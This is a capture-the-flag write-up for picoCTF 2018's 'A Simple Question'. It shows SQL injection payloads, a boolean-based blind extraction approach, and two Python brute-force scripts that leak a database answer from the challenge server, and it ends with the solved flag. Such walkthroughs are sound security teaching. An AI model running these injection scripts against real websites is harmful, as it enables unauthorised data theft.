# A Simple Question
Web Exploitation, 650 points

## Description:
> There is a website running at http://2018shell3.picoctf.com:15987 (link). Try to see if you can answer its question.  


## Solution:

We are presented with a web form which contains a single question: "What is the answer?".

If we attempt to provide an arbitrary answer such as "42", we receive the following response:
```
SQL query: SELECT * FROM answers WHERE answer='42'

Wrong.
```

This looks like it's inviting SQL injection, so we enter "'" and confirm this suspicion:
```
SQL query: SELECT * FROM answers WHERE answer='''


Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''" in /problems/a-simple-question_1_38a5203a4bf2b6a7be17ddae277acc80/webroot/answer2.php on line 15

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/a-simple-question_1_38a5203a4bf2b6a7be17ddae277acc80/webroot/answer2.php:17 Stack trace: #0 {main} thrown in /problems/a-simple-question_1_38a5203a4bf2b6a7be17ddae277acc80/webroot/answer2.php on line 17
```

Trying various inputs brings us finally to the following one:
```
' union SELECT answer from answers where answer like '%
```

Which outputs:
```
SQL query: SELECT * FROM answers WHERE answer='' union SELECT answer from answers where answer like '%'

You are so close.
```

Playing around a bit more shows that we will need to use a boolean based injection attack.

For example, sending:
```
' union SELECT answer from answers where answer like '4%
```

Will result in:
```
SQL query: SELECT * FROM answers WHERE answer='' union SELECT answer from answers where answer like '4%'

You are so close.
```

But, sending:
```
' union SELECT answer from answers where answer like '5%
```

Will result in:
```
SQL query: SELECT * FROM answers WHERE answer='' union SELECT answer from answers where answer like '5%'

Wrong.
```

So, we can write a trivial brute-forcer which performs the following:
* Start with flag = ""
* For each printable char c:
  *  Set "partial_flag = flag + c" and try "`where answer like '<partial_flag>%`" 
  *  If "You are so close", append c to flag

Performing this gives us the flag "41andsixsixths" (we were almost right with our original guess!). However, surprisingly, the form does not accept this as the correct answer. Our method has a flaw: It assumes that if a positive response was received from the server, c is part of the flag. This is not necessarily correct.

Assume that the server will return "Wrong" if 0 results were returned from the query, and "You are so close" otherwise. Assume also that our table has two rows:
```
41andsixsixths
41Andsixsixths
```

Our naive method continues to the next character once it receives a positive response from the server, while there might be several other characters which would return a positive response as well. Therefore, we must attempt all possible "branches".

Therefore, the next step was to try and set an upper bound on the length of the answer.

First, by brute forcing it:
```python
import requests
q = "' union SELECT answer from answers where length(answer) = {} and answer like '%"
for i in range(100):
    r = requests.post("http://2018shell3.picoctf.com:15987/answer2.php",
                      data = {"answer": q.format(i), "debug": 1})
    if "You are so close." in r.text:
        print ("{}".format(i))
```

Then by confirming that 14 was the only valid result:
```
Input:
' union SELECT answer from answers where length(answer) != 14 and answer like '%

Output:
SQL query: SELECT * FROM answers WHERE answer='' union SELECT answer from answers where length(answer) != 14 and answer like '%'

Wrong.
```

So we know that the answer length is 14.

Now we can create a wider brute force attack:
```python
import requests
import string


URL = "http://2018shell3.picoctf.com:15987/answer2.php"

FLAG_LEN = 14
SPECIAL_CHARS = "%_"

def is_correct(guess):
    print ("Attempt: \t {}".format(guess))
    r = requests.post(URL, data = {"answer": guess, "debug": 0})
    if "You are so close." in r.text or "Wrong" in r.text:
        return False
    print ("Flag found: {}\n{}".format(guess, r.text))
    return True

def is_good_guess(guess):
    r = requests.post(URL, data = {"answer": "' union SELECT answer from answers where answer like '{}%".format(guess), "debug": 0})
    return "You are so close." in r.text

def solve(candidate):
    if len(candidate) == FLAG_LEN:
        return is_correct(candidate)

    for c in string.printable:
        if c == "'":
            continue
        if c in SPECIAL_CHARS:
            c = "\\" + c
        guess = candidate + c
        if is_good_guess(guess):
            if solve(guess):
                return True
    return False

solve("")
```

We use recursion to backtrack, trying out every path that gives us a positive response.

Running this gives the following (partial) output:
```
Attempt:         41andsixsixths
Attempt:         41andsixsixthS
Attempt:         41andsixsixtHs
Attempt:         41andsixsixtHS
Attempt:         41andsixsixThs
Attempt:         41andsixsixThS
Attempt:         41andsixsixTHs
Attempt:         41andsixsixTHS
Attempt:         41andsixsiXths
Attempt:         41andsixsiXthS
Attempt:         41andsixsiXtHs
Attempt:         41andsixsiXtHS
Attempt:         41andsixsiXThs
Attempt:         41andsixsiXThS
Attempt:         41andsixsiXTHs
Attempt:         41andsixsiXTHS
Attempt:         41andsixsIxths
Attempt:         41andsixsIxthS
Attempt:         41andsixsIxtHs
Attempt:         41andsixsIxtHS
Attempt:         41andsixsIxThs
Attempt:         41andsixsIxThS
Attempt:         41andsixsIxTHs
Attempt:         41andsixsIxTHS
Attempt:         41andsixsIXths
Attempt:         41andsixsIXthS
Attempt:         41andsixsIXtHs
Attempt:         41andsixsIXtHS
Attempt:         41andsixsIXThs
Attempt:         41andsixsIXThS
Attempt:         41andsixsIXTHs
Attempt:         41andsixsIXTHS
Attempt:         41andsixSixths
Attempt:         41andsixSixthS
Attempt:         41andsixSixtHs
Attempt:         41andsixSixtHS
```

It goes on and on, but it's pretty safe to assume that all combinations of uppercase-lowercase spelling exist in the DB.

While letting the script run in parallel, I tried to guess some common casing conventions, and got it right with CamelCase: `41AndSixSixths`.

The output:
```
SQL query: SELECT * FROM answers WHERE answer='41AndSixSixths'

Perfect!

Your flag is: picoCTF{qu3stions_ar3_h4rd_41da9e94}
```

The flag: picoCTF{qu3stions_ar3_h4rd_41da9e94}